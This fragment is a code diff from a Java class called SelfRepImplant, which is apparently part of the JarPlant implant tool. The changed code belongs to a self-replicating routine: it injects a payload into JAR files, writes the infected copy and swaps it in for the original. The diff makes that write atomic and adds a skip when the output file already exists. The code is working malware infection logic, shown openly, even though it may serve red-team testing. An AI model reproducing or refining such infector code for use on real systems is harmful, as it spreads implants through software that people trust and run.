@@ -145,7 +145,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             try {
                 boolean didInfect = injector.injectInto(jar);
                 if (didInfect) {
-                    jar.write(outputTempFile);
+                    jar.write(outputTempFile, StandardOpenOption.CREATE_NEW);   // Atomic operation, failing on collision
                     System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
                     doTheSwitcharoo(jarToImplant, outputTempFile);
                     numInfected++;
@@ -155,6 +155,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 } else {
                     System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
                 }
+            } catch (FileAlreadyExistsException e) {
+                System.out.println("[-] File '" + outputTempFile + "' already exist. Skipping to avoid problems.");
             } catch (IOException e) {
                 System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
                 //e.printStackTrace();
